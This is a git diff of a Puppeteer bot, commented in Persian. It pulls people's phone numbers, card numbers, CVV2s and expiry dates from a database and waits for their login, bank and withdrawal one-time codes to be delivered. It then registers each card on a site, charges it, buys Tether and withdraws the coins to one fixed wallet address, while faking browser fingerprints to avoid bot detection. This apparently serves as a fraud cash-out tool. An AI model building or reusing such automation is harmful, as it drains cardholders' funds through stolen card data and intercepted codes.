@@ -81,36 +81,211 @@ async function clearAndType(page, selector, text) {
 }
 
 async function takeScreenshot(page, name) {
-  await page.screenshot({ path: `debug-${name}-${Date.now()}.png` });
+  await page.screenshot({ path: `debug-${name}-${Date.now()}.png`, fullPage: true });
   log.debug(`اسکرین‌شات ذخیره شد: debug-${name}-${Date.now()}.png`);
 }
 
-async function waitAndClick(page, selectors, timeout = 5000) {
-  for (const selector of selectors) {
+async function findAllInputs(page) {
+  return await page.evaluate(() => {
+    const inputs = Array.from(document.querySelectorAll('input'));
+    return inputs.map(input => ({
+      type: input.type,
+      name: input.name,
+      id: input.id,
+      placeholder: input.placeholder,
+      className: input.className,
+      'data-testid': input.getAttribute('data-testid'),
+      outerHTML: input.outerHTML
+    }));
+  });
+}
+
+async function findElementByText(page, text) {
+  return await page.evaluate((text) => {
+    const elements = Array.from(document.querySelectorAll('*'));
+    return elements.filter(el => {
+      const elementText = el.textContent || el.innerText;
+      return elementText.includes(text);
+    }).map(el => ({
+      tagName: el.tagName,
+      text: el.textContent,
+      className: el.className,
+      id: el.id,
+      outerHTML: el.outerHTML
+    }));
+  }, text);
+}
+
+async function advancedFindAndType(page, text, fieldType = 'phone') {
+  // پیدا کردن تمام input ها
+  const allInputs = await findAllInputs(page);
+  log.debug(`تعداد کل input ها: ${allInputs.length}`);
+  
+  // لاگ تمام input ها برای دیباگ
+  allInputs.forEach((input, index) => {
+    log.debug(`Input ${index + 1}: type=${input.type}, name=${input.name}, placeholder=${input.placeholder}, class=${input.className}`);
+  });
+
+  // سلکتورهای گسترده‌تر
+  const extendedSelectors = [
+    // سلکتورهای عمومی
+    'input',
+    'input[type="text"]',
+    'input:not([type="hidden"])',
+    
+    // سلکتورهای بر اساس placeholder
+    'input[placeholder*="موبایل"]',
+    'input[placeholder*="شماره"]',
+    'input[placeholder*="09"]',
+    'input[placeholder*="phone"]',
+    'input[placeholder*="mobile"]',
+    'input[placeholder*="کد"]',
+    'input[placeholder*="رمز"]',
+    
+    // سلکتورهای بر اساس class
+    'input.form-control',
+    'input.form-input',
+    'input.input-field',
+    'input.text-input',
+    
+    // سلکتورهای خاص
+    'input[autocomplete="tel"]',
+    'input[inputmode="tel"]',
+    'input.tel-input',
+    'input[type="number"]'
+  ];
+
+  // امتحان کردن تمام سلکتورها
+  for (const selector of extendedSelectors) {
     try {
-      await page.waitForSelector(selector, { timeout });
-      await page.click(selector);
-      log.i(`کلیک شد با سلکتور: ${selector}`);
-      return true;
+      const elements = await page.$$(selector);
+      for (const element of elements) {
+        const isVisible = await page.evaluate(el => {
+          const style = window.getComputedStyle(el);
+          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
+        }, element);
+        
+        if (isVisible) {
+          const boundingBox = await element.boundingBox();
+          if (boundingBox && boundingBox.width > 50 && boundingBox.height > 10) {
+            log.i(`فیلد پیدا شد با سلکتور: ${selector}`);
+            await element.click({ clickCount: 3 });
+            await page.waitForTimeout(500);
+            await element.type(text, { delay: 100 });
+            log.s(`متن وارد شد: ${text}`);
+            return true;
+          }
+        }
+      }
     } catch (e) {
-      log.debug(`سلکتور ${selector} پیدا نشد`);
+      log.debug(`سلکتور ${selector} ناموفق: ${e.message}`);
     }
   }
+
+  // استفاده از XPath
+  const xpathSelectors = [
+    '//input[contains(@placeholder, "موبایل")]',
+    '//input[contains(@placeholder, "شماره")]',
+    '//input[contains(@placeholder, "کد")]',
+    '//input[@type="tel"]',
+    '//input[@type="number"]',
+    '(//input[@type="text"])[1]',
+    '//input[not(@type="hidden")][1]'
+  ];
+
+  for (const xpath of xpathSelectors) {
+    try {
+      const elements = await page.$x(xpath);
+      if (elements.length > 0) {
+        const element = elements[0];
+        const isVisible = await page.evaluate(el => {
+          const style = window.getComputedStyle(el);
+          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
+        }, element);
+        
+        if (isVisible) {
+          log.i(`فیلد پیدا شد با XPath: ${xpath}`);
+          await element.click({ clickCount: 3 });
+          await page.waitForTimeout(500);
+          await element.type(text, { delay: 100 });
+          log.s(`متن وارد شد: ${text}`);
+          return true;
+        }
+      }
+    } catch (e) {
+      log.debug(`XPath ${xpath} ناموفق: ${e.message}`);
+    }
+  }
+
   return false;
 }
 
-async function waitAndType(page, selectors, text, timeout = 5000) {
-  for (const selector of selectors) {
+async function advancedFindAndClick(page, buttonTexts) {
+  // پیدا کردن دکمه بر اساس متن با XPath
+  for (const text of buttonTexts) {
     try {
-      await page.waitForSelector(selector, { timeout });
-      await clearAndType(page, selector, text);
-      log.i(`تایپ شد در سلکتور: ${selector}`);
-      return true;
+      const elements = await page.$x(`//*[contains(text(), "${text}")]`);
+      for (const element of elements) {
+        const tagName = await page.evaluate(el => el.tagName, element);
+        const isVisible = await page.evaluate(el => {
+          const style = window.getComputedStyle(el);
+          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
+        }, element);
+        
+        if (isVisible && ['BUTTON', 'INPUT', 'A', 'DIV', 'SPAN'].includes(tagName)) {
+          log.i(`دکمه پیدا شد با متن: ${text}`);
+          await element.click();
+          return true;
+        }
+      }
     } catch (e) {
-      log.debug(`سلکتور ${selector} پیدا نشد`);
+      log.debug(`دکمه با متن ${text} ناموفق: ${e.message}`);
     }
   }
+
+  // پیدا کردن دکمه بر اساس سلکتورهای عمومی
+  const buttonSelectors = [
+    'button',
+    'button[type="submit"]',
+    'input[type="submit"]',
+    '.btn',
+    '.button',
+    'a.btn',
+    '[role="button"]'
+  ];
+
+  for (const selector of buttonSelectors) {
+    try {
+      const elements = await page.$$(selector);
+      for (const element of elements) {
+        const isVisible = await page.evaluate(el => {
+          const style = window.getComputedStyle(el);
+          return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0' && el.offsetWidth > 0 && el.offsetHeight > 0;
+        }, element);
+        
+        if (isVisible) {
+          log.i(`دکمه کلیک شد با سلکتور: ${selector}`);
+          await element.click();
+          return true;
+        }
+      }
+    } catch (e) {
+      log.debug(`سلکتور دکمه ${selector} ناموفق: ${e.message}`);
+    }
+  }
+
   return false;
+}
+
+async function waitForNavigationOrTimeout(page, timeout = 10000) {
+  try {
+    await Promise.race([
+      page.waitForNavigation({ waitUntil: 'networkidle2', timeout }),
+      new Promise(resolve => setTimeout(resolve, timeout))
+    ]);
+  } catch (e) {
+    log.debug('Navigation timeout or not needed');
+  }
 }
 
 async function processUser(doc) {
@@ -129,255 +304,178 @@ async function processUser(doc) {
 
     browser = await puppeteer.launch({
       headless: true,
-      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
+      args: [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--disable-dev-shm-usage',
+        '--no-zygote',
+        '--disable-web-security',
+        '--disable-features=site-per-process'
+      ]
     });
 
     const page = await browser.newPage();
-    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
-    await page.setViewport({ width: 390, height: 844 });
     
+    // تنظیمات صفحه برای شبیه‌سازی موبایل
+    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36");
+    await page.setViewport({ width: 390, height: 844, deviceScaleFactor: 3 });
+    
+    // جلوگیری از تشخیص ربات
+    await page.evaluateOnNewDocument(() => {
+      Object.defineProperty(navigator, 'webdriver', { get: () => false });
+      Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
+    });
+
     // مرحله 1: ورود به سایت
     log.i("در حال بارگذاری صفحه اصلی...");
-    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
+    await page.goto(SITE_URL, { 
+      waitUntil: "networkidle2", 
+      timeout: 60000 
+    });
     log.i("صفحه اصلی لود شد");
 
-    // سلکتورهای فیلد تلفن برای نسخه جدید
-    const phoneSelectors = [
-      'input[data-testid="username-input"]',
-      'input[name="username"]',
-      'input[placeholder*="شماره موبایل"]',
-      'input[inputmode="numeric"]',
-      'input[type="tel"]',
-      '.phone-input',
-      '#mobile'
-    ];
+    // ذخیره اسکرین‌شات از صفحه اصلی
+    await takeScreenshot(page, 'main-page-loaded');
 
-    if (!await waitAndType(page, phoneSelectors, phone)) {
-      await takeScreenshot(page, 'no-phone-field');
+    // مرحله 1.1: پیدا کردن و پر کردن فیلد تلفن
+    log.i("در حال پیدا کردن فیلد تلفن...");
+    if (!await advancedFindAndType(page, phone, 'phone')) {
+      await takeScreenshot(page, 'phone-field-not-found');
       throw new Error("فیلد تلفن پیدا نشد");
     }
 
-    // دکمه ادامه برای ورود
-    const continueButtons = [
-      'button[data-testid="login-button"]',
-      'button[type="submit"]',
-      'button:has-text("ادامه")',
-      'button:has-text("ورود")',
-      '.submit-btn',
-      '.login-btn'
-    ];
-
-    if (!await waitAndClick(page, continueButtons)) {
-      await takeScreenshot(page, 'no-continue-button');
+    // مرحله 1.2: پیدا کردن و کلیک روی دکمه ادامه
+    log.i("در حال پیدا کردن دکمه ادامه...");
+    if (!await advancedFindAndClick(page, ["ادامه", "ورود", "تأیید", "下一步", "Continue", "Login"])) {
+      await takeScreenshot(page, 'continue-button-not-found');
       throw new Error("دکمه ادامه پیدا نشد");
     }
+
+    log.s("شماره تلفن وارد شد و دکمه ادامه کلیک شد");
+    await page.waitForTimeout(3000);
 
     // مرحله 2: دریافت و وارد کردن OTP ورود
     log.i("در انتظار دریافت کد OTP برای ورود...");
     const otpLogin = await waitForOtp(doc._id, "otp_login");
     
-    // سلکتورهای OTP
-    const otpSelectors = [
-      'input[data-testid="otp-input"]',
-      'input[name="otp"]',
-      'input[placeholder*="کد تأیید"]',
-      'input[placeholder*="رمز یکبارمصرف"]',
-      'input[type="number"]',
-      '.otp-input',
-      '#otp'
-    ];
-
-    if (!await waitAndType(page, otpSelectors, otpLogin, 10000)) {
-      await takeScreenshot(page, 'no-otp-field');
+    // مرحله 2.1: پیدا کردن فیلد OTP
+    log.i("در حال پیدا کردن فیلد OTP...");
+    await page.waitForTimeout(5000);
+    
+    if (!await advancedFindAndType(page, otpLogin, 'otp')) {
+      await takeScreenshot(page, 'otp-field-not-found');
       throw new Error("فیلد OTP پیدا نشد");
     }
 
-    // دکمه تأیید OTP
-    const verifyButtons = [
-      'button[data-testid="verify-button"]',
-      'button:has-text("تأیید")',
-      'button:has-text("ورود")',
-      'button[type="submit"]',
-      '.verify-btn'
-    ];
-
-    if (!await waitAndClick(page, verifyButtons)) {
-      await takeScreenshot(page, 'no-verify-button');
-      throw new Error("دکمه تأیید پیدا نشد");
+    // مرحله 2.2: کلیک روی دکمه تأیید OTP
+    log.i("در حال پیدا کردن دکمه تأیید OTP...");
+    if (!await advancedFindAndClick(page, ["تأیید", "ورود", "Verify", "Confirm", "اعتبار سنجی"])) {
+      await takeScreenshot(page, 'verify-button-not-found');
+      throw new Error("دکمه تأیید OTP پیدا نشد");
     }
 
     log.s("ورود با موفقیت انجام شد");
     await page.waitForTimeout(5000);
+    await takeScreenshot(page, 'after-login');
 
-    // مرحله 3: رفتن به صفحه کارت‌ها
+    // مرحله 3: رفتن به صفحه پروفایل/کارت‌ها
     log.i("در حال رفتن به صفحه کارت‌ها...");
     
-    // تلاش برای دسترسی به منو
-    const menuSelectors = [
-      'button[data-testid="profile-menu"]',
-      '.profile-menu',
-      'a[href*="/profile"]',
-      'button:has-text("پروفایل")'
-    ];
-
-    if (await waitAndClick(page, menuSelectors)) {
-      await page.waitForTimeout(2000);
+    // تلاش برای پیدا کردن منو
+    if (!await advancedFindAndClick(page, ["پروفایل", "کارت‌ها", "Profile", "Cards"])) {
+      // اگر منو پیدا نشد، مستقیماً به آدرس برو
+      await page.goto(`${SITE_URL}/cards`, { waitUntil: 'networkidle2' });
     }
 
-    // رفتن به کارت‌ها
-    const cardMenuSelectors = [
-      'a[href*="/cards"]',
-      'a[href*="/card"]',
-      'button:has-text("کارت‌ها")',
-      'button:has-text("مدیریت کارت")'
-    ];
-
-    if (!await waitAndClick(page, cardMenuSelectors)) {
-      // تلاش مستقیم
-      await page.goto(`${SITE_URL}/cards`, { waitUntil: "networkidle2" });
-    }
+    await page.waitForTimeout(3000);
 
     // مرحله 4: افزودن کارت جدید
     log.i("در حال افزودن کارت جدید...");
     
-    const addCardButtons = [
-      'button[data-testid="add-card-button"]',
-      'button:has-text("افزودن کارت")',
-      'button:has-text("کارت جدید")',
-      '.add-card-btn'
-    ];
-
-    if (!await waitAndClick(page, addCardButtons)) {
-      await takeScreenshot(page, 'no-add-card-button');
+    if (!await advancedFindAndClick(page, ["افزودن کارت", "کارت جدید", "Add Card", "New Card"])) {
+      await takeScreenshot(page, 'add-card-button-not-found');
       throw new Error("دکمه افزودن کارت پیدا نشد");
     }
 
-    // وارد کردن اطلاعات کارت
     await page.waitForTimeout(2000);
 
-    // شماره کارت
-    const cardNumberSelectors = [
-      'input[data-testid="card-number-input"]',
-      'input[name="cardNumber"]',
-      'input[placeholder*="شماره کارت"]',
-      '#cardNumber'
-    ];
-
-    if (!await waitAndType(page, cardNumberSelectors, card)) {
-      await takeScreenshot(page, 'no-card-number-field');
+    // مرحله 4.1: وارد کردن شماره کارت
+    log.i("در حال وارد کردن شماره کارت...");
+    if (!await advancedFindAndType(page, card, 'card')) {
+      await takeScreenshot(page, 'card-number-field-not-found');
       throw new Error("فیلد شماره کارت پیدا نشد");
     }
 
-    // CVV2
-    const cvv2Selectors = [
-      'input[data-testid="cvv2-input"]',
-      'input[name="cvv2"]',
-      'input[placeholder*="CVV2"]',
-      'input[placeholder*="کد امنیتی"]',
-      '#cvv2'
-    ];
-
-    if (!await waitAndType(page, cvv2Selectors, cvv2)) {
-      await takeScreenshot(page, 'no-cvv2-field');
+    // مرحله 4.2: وارد کردن CVV2
+    log.i("در حال وارد کردن CVV2...");
+    if (!await advancedFindAndType(page, cvv2, 'cvv2')) {
+      await takeScreenshot(page, 'cvv2-field-not-found');
       throw new Error("فیلد CVV2 پیدا نشد");
     }
 
-    // تاریخ انقضا - ماه
-    const monthSelectors = [
-      'select[name="month"]',
-      'input[name="month"]',
-      '#month',
-      '[data-testid="month-select"]'
-    ];
-
-    for (const selector of monthSelectors) {
-      try {
-        await page.waitForSelector(selector, { timeout: 3000 });
-        if (selector.startsWith('select')) {
+    // مرحله 4.3: وارد کردن تاریخ انقضا
+    log.i("در حال وارد کردن تاریخ انقضا...");
+    
+    // ماه
+    if (!await advancedFindAndType(page, month.toString(), 'month')) {
+      log.w("فیلد ماه پیدا نشد، استفاده از سلکتور");
+      // استفاده از سلکتور برای ماه
+      const monthSelectors = ['select[name="month"]', 'input[name="month"]', '#month'];
+      for (const selector of monthSelectors) {
+        try {
           await page.select(selector, month.toString());
-        } else {
-          await clearAndType(page, selector, month.toString());
-        }
-        log.i(`ماه وارد شد: ${month}`);
-        break;
-      } catch (e) {}
+          log.i("ماه وارد شد");
+          break;
+        } catch (e) {}
+      }
     }
 
-    // تاریخ انقضا - سال
-    const yearSelectors = [
-      'select[name="year"]',
-      'input[name="year"]',
-      '#year',
-      '[data-testid="year-select"]'
-    ];
-
-    for (const selector of yearSelectors) {
-      try {
-        await page.waitForSelector(selector, { timeout: 3000 });
-        if (selector.startsWith('select')) {
+    // سال
+    if (!await advancedFindAndType(page, year.toString(), 'year')) {
+      log.w("فیلد سال پیدا نشد، استفاده از سلکتور");
+      // استفاده از سلکتور برای سال
+      const yearSelectors = ['select[name="year"]', 'input[name="year"]', '#year'];
+      for (const selector of yearSelectors) {
+        try {
           await page.select(selector, year.toString());
-        } else {
-          await clearAndType(page, selector, year.toString());
-        }
-        log.i(`سال وارد شد: ${year}`);
-        break;
-      } catch (e) {}
+          log.i("سال وارد شد");
+          break;
+        } catch (e) {}
+      }
     }
 
-    // دکمه ثبت کارت
-    const submitCardButtons = [
-      'button[data-testid="submit-card-button"]',
-      'button:has-text("ثبت کارت")',
-      'button:has-text("ذخیره")',
-      'button[type="submit"]'
-    ];
-
-    if (!await waitAndClick(page, submitCardButtons)) {
-      await takeScreenshot(page, 'no-submit-card-button');
+    // مرحله 4.4: ثبت کارت
+    log.i("در حال ثبت کارت...");
+    if (!await advancedFindAndClick(page, ["ثبت کارت", "ذخیره", "Register Card", "Save"])) {
+      await takeScreenshot(page, 'register-card-button-not-found');
       throw new Error("دکمه ثبت کارت پیدا نشد");
     }
 
     log.s("کارت با موفقیت ثبت شد");
-    await page.waitForTimeout(3000);
+    await page.waitForTimeout(5000);
 
     // مرحله 5: شارژ حساب
     log.i("شروع فرآیند شارژ حساب...");
     
     // رفتن به صفحه شارژ
-    const chargeSelectors = [
-      'a[href*="/charge"]',
-      'button:has-text("شارژ")',
-      'button:has-text("افزایش موجودی")',
-      '.charge-btn'
-    ];
-
-    if (!await waitAndClick(page, chargeSelectors)) {
-      await page.goto(`${SITE_URL}/charge`, { waitUntil: "networkidle2" });
+    if (!await advancedFindAndClick(page, ["شارژ", "افزایش موجودی", "Charge", "Deposit"])) {
+      await page.goto(`${SITE_URL}/charge`, { waitUntil: 'networkidle2' });
     }
 
-    // وارد کردن مبلغ
-    const amountSelectors = [
-      'input[data-testid="amount-input"]',
-      'input[name="amount"]',
-      'input[placeholder*="مبلغ"]',
-      '#amount'
-    ];
+    await page.waitForTimeout(3000);
 
-    if (!await waitAndType(page, amountSelectors, AMOUNT_IRT.toString())) {
-      await takeScreenshot(page, 'no-amount-field');
+    // وارد کردن مبلغ
+    log.i("در حال وارد کردن مبلغ شارژ...");
+    if (!await advancedFindAndType(page, AMOUNT_IRT.toString(), 'amount')) {
+      await takeScreenshot(page, 'amount-field-not-found');
       throw new Error("فیلد مبلغ پیدا نشد");
     }
 
-    // دکمه پرداخت
-    const paymentButtons = [
-      'button[data-testid="payment-button"]',
-      'button:has-text("پرداخت")',
-      'button:has-text("شارژ")',
-      '.payment-btn'
-    ];
-
-    if (!await waitAndClick(page, paymentButtons)) {
-      await takeScreenshot(page, 'no-payment-button');
+    // کلیک روی دکمه پرداخت
+    log.i("در حال کلیک روی دکمه پرداخت...");
+    if (!await advancedFindAndClick(page, ["پرداخت", "شارژ", "Payment", "Pay"])) {
+      await takeScreenshot(page, 'payment-button-not-found');
       throw new Error("دکمه پرداخت پیدا نشد");
     }
 
@@ -387,29 +485,16 @@ async function processUser(doc) {
     
     await page.waitForTimeout(5000);
 
-    const bankOtpSelectors = [
-      'input[data-testid="bank-otp-input"]',
-      'input[name="otp"]',
-      'input[type="password"]',
-      'input[placeholder*="رمز دوم"]',
-      '#otp'
-    ];
-
-    if (!await waitAndType(page, bankOtpSelectors, otpBank, 10000)) {
-      await takeScreenshot(page, 'no-bank-otp-field');
+    log.i("در حال وارد کردن OTP بانک...");
+    if (!await advancedFindAndType(page, otpBank, 'bank-otp')) {
+      await takeScreenshot(page, 'bank-otp-field-not-found');
       throw new Error("فیلد OTP بانک پیدا نشد");
     }
 
-    // دکمه تأیید پرداخت
-    const confirmPaymentButtons = [
-      'button[data-testid="confirm-payment-button"]',
-      'button:has-text("تأیید")',
-      'button:has-text("پرداخت")',
-      'button[type="submit"]'
-    ];
-
-    if (!await waitAndClick(page, confirmPaymentButtons)) {
-      await takeScreenshot(page, 'no-confirm-payment-button');
+    // تأیید پرداخت
+    log.i("در حال تأیید پرداخت...");
+    if (!await advancedFindAndClick(page, ["تأیید", "پرداخت", "Confirm", "Verify"])) {
+      await takeScreenshot(page, 'confirm-payment-button-not-found');
       throw new Error("دکمه تأیید پرداخت پیدا نشد");
     }
 
@@ -420,41 +505,24 @@ async function processUser(doc) {
     log.i("شروع فرآیند خرید تتر...");
     
     // رفتن به صفحه خرید
-    const buySelectors = [
-      'a[href*="/buy"]',
-      'button:has-text("خرید")',
-      'button:has-text("خرید تتر")',
-      '.buy-btn'
-    ];
-
-    if (!await waitAndClick(page, buySelectors)) {
-      await page.goto(`${SITE_URL}/buy`, { waitUntil: "networkidle2" });
+    if (!await advancedFindAndClick(page, ["خرید", "خرید تتر", "Buy", "Purchase"])) {
+      await page.goto(`${SITE_URL}/buy`, { waitUntil: 'networkidle2' });
     }
 
-    // وارد کردن مبلغ خرید
-    const buyAmountSelectors = [
-      'input[data-testid="buy-amount-input"]',
-      'input[name="amount"]',
-      'input[placeholder*="مبلغ"]',
-      '#buyAmount'
-    ];
+    await page.waitForTimeout(3000);
 
-    const tetherAmount = (AMOUNT_IRT / 100000).toFixed(6); // تبدیل به تتر
-    if (!await waitAndType(page, buyAmountSelectors, tetherAmount)) {
-      await takeScreenshot(page, 'no-buy-amount-field');
+    // وارد کردن مبلغ خرید
+    log.i("در حال وارد کردن مبلغ خرید...");
+    const tetherAmount = (AMOUNT_IRT / 100000).toFixed(6);
+    if (!await advancedFindAndType(page, tetherAmount, 'buy-amount')) {
+      await takeScreenshot(page, 'buy-amount-field-not-found');
       throw new Error("فیلد مبلغ خرید پیدا نشد");
     }
 
-    // دکمه خرید
-    const buyButtons = [
-      'button[data-testid="buy-button"]',
-      'button:has-text("خرید")',
-      'button:has-text("خرید تتر")',
-      '.buy-submit-btn'
-    ];
-
-    if (!await waitAndClick(page, buyButtons)) {
-      await takeScreenshot(page, 'no-buy-button');
+    // کلیک روی دکمه خرید
+    log.i("در حال کلیک روی دکمه خرید...");
+    if (!await advancedFindAndClick(page, ["خرید", "خرید تتر", "Buy", "Purchase"])) {
+      await takeScreenshot(page, 'buy-button-not-found');
       throw new Error("دکمه خرید پیدا نشد");
     }
 
@@ -465,53 +533,30 @@ async function processUser(doc) {
     log.i("شروع فرآیند برداشت به کیف پول...");
     
     // رفتن به صفحه برداشت
-    const withdrawSelectors = [
-      'a[href*="/withdraw"]',
-      'button:has-text("برداشت")',
-      'button:has-text("برداشت تتر")',
-      '.withdraw-btn'
-    ];
-
-    if (!await waitAndClick(page, withdrawSelectors)) {
-      await page.goto(`${SITE_URL}/withdraw`, { waitUntil: "networkidle2" });
+    if (!await advancedFindAndClick(page, ["برداشت", "برداشت تتر", "Withdraw", "Withdrawal"])) {
+      await page.goto(`${SITE_URL}/withdraw`, { waitUntil: 'networkidle2' });
     }
 
-    // وارد کردن آدرس کیف پول
-    const walletSelectors = [
-      'input[data-testid="wallet-address-input"]',
-      'input[name="wallet"]',
-      'input[placeholder*="آدرس کیف پول"]',
-      '#wallet'
-    ];
+    await page.waitForTimeout(3000);
 
-    if (!await waitAndType(page, walletSelectors, WALLET_ADDRESS)) {
-      await takeScreenshot(page, 'no-wallet-field');
+    // وارد کردن آدرس کیف پول
+    log.i("در حال وارد کردن آدرس کیف پول...");
+    if (!await advancedFindAndType(page, WALLET_ADDRESS, 'wallet')) {
+      await takeScreenshot(page, 'wallet-field-not-found');
       throw new Error("فیلد آدرس کیف پول پیدا نشد");
     }
 
     // وارد کردن مبلغ برداشت
-    const withdrawAmountSelectors = [
-      'input[data-testid="withdraw-amount-input"]',
-      'input[name="amount"]',
-      'input[placeholder*="مبلغ"]',
-      '#withdrawAmount'
-    ];
-
-    if (!await waitAndType(page, withdrawAmountSelectors, tetherAmount)) {
-      await takeScreenshot(page, 'no-withdraw-amount-field');
+    log.i("در حال وارد کردن مبلغ برداشت...");
+    if (!await advancedFindAndType(page, tetherAmount, 'withdraw-amount')) {
+      await takeScreenshot(page, 'withdraw-amount-field-not-found');
       throw new Error("فیلد مبلغ برداشت پیدا نشد");
     }
 
-    // دکمه برداشت
-    const withdrawButtons = [
-      'button[data-testid="withdraw-button"]',
-      'button:has-text("برداشت")',
-      'button:has-text("ثبت درخواست")',
-      '.withdraw-submit-btn'
-    ];
-
-    if (!await waitAndClick(page, withdrawButtons)) {
-      await takeScreenshot(page, 'no-withdraw-button');
+    // کلیک روی دکمه برداشت
+    log.i("در حال کلیک روی دکمه برداشت...");
+    if (!await advancedFindAndClick(page, ["برداشت", "ثبت درخواست", "Withdraw", "Submit"])) {
+      await takeScreenshot(page, 'withdraw-button-not-found');
       throw new Error("دکمه برداشت پیدا نشد");
     }
 
@@ -521,42 +566,32 @@ async function processUser(doc) {
     
     await page.waitForTimeout(5000);
 
-    const withdrawOtpSelectors = [
-      'input[data-testid="withdraw-otp-input"]',
-      'input[name="otp"]',
-      'input[placeholder*="کد تأیید"]',
-      '#withdrawOtp'
-    ];
-
-    if (!await waitAndType(page, withdrawOtpSelectors, otpWithdraw, 10000)) {
-      await takeScreenshot(page, 'no-withdraw-otp-field');
+    log.i("در حال وارد کردن OTP برداشت...");
+    if (!await advancedFindAndType(page, otpWithdraw, 'withdraw-otp')) {
+      await takeScreenshot(page, 'withdraw-otp-field-not-found');
       throw new Error("فیلد OTP برداشت پیدا نشد");
     }
 
-    // دکمه تأیید نهایی
-    const finalConfirmButtons = [
-      'button[data-testid="final-confirm-button"]',
-      'button:has-text("تأیید")',
-      'button:has-text("برداشت")',
-      'button[type="submit"]'
-    ];
-
-    if (!await waitAndClick(page, finalConfirmButtons)) {
-      await takeScreenshot(page, 'no-final-confirm-button');
+    // تأیید نهایی
+    log.i("در حال تأیید نهایی برداشت...");
+    if (!await advancedFindAndClick(page, ["تأیید", "برداشت", "Confirm", "Finalize"])) {
+      await takeScreenshot(page, 'final-confirm-button-not-found');
       throw new Error("دکمه تأیید نهایی پیدا نشد");
     }
 
     log.s("برداشت با موفقیت انجام شد");
     await page.waitForTimeout(5000);
+    await takeScreenshot(page, 'final-success');
 
-    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
+    log.s(`🎉 تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
     await collection.updateOne({ _id: doc._id }, { 
       $set: { 
         processed: true, 
         status: "completed", 
         completedAt: new Date(),
         walletAddress: WALLET_ADDRESS,
-        amount: AMOUNT_IRT
+        amount: AMOUNT_IRT,
+        finalResult: "موفقیت آمیز"
       } 
     });
 
@@ -566,7 +601,8 @@ async function processUser(doc) {
       $set: { 
         status: "failed", 
         error: err.message,
-        failedAt: new Date()
+        failedAt: new Date(),
+        finalResult: "ناموفق"
       } 
     });
   } finally {
@@ -575,7 +611,7 @@ async function processUser(doc) {
   }
 }
 
-// Polling هر ۵ ثانیه
+// Polling هر ۱۰ ثانیه
 async function startPolling() {
   await connectDB();
 
@@ -584,7 +620,7 @@ async function startPolling() {
       const users = await collection.find({
         processed: { $ne: true },
         processing: { $ne: true }
-      }).limit(5).toArray();
+      }).limit(2).toArray();
 
       if (users.length === 0) {
         if (Date.now() - lastNoUsersLog > 30000) {
@@ -596,13 +632,28 @@ async function startPolling() {
 
       for (const user of users) {
         if (isReady(user)) {
-          processUser(user);
+          await processUser(user);
+          await new Promise(r => setTimeout(r, 15000)); // تأخیر ۱۵ ثانیه بین پردازش کاربران
         }
       }
     } catch (err) {
       log.e("Polling error: " + err.message);
     }
-  }, 5000);
+  }, 10000);
 }
 
-startPolling();
+// مدیریت graceful shutdown
+process.on('SIGINT', async () => {
+  log.i("در حال خروج...");
+  process.exit(0);
+});
+
+process.on('SIGTERM', async () => {
+  log.i("در حال خروج...");
+  process.exit(0);
+});
+
+startPolling().catch(err => {
+  log.e("خطا در شروع برنامه: " + err.message);
+  process.exit(1);
+});
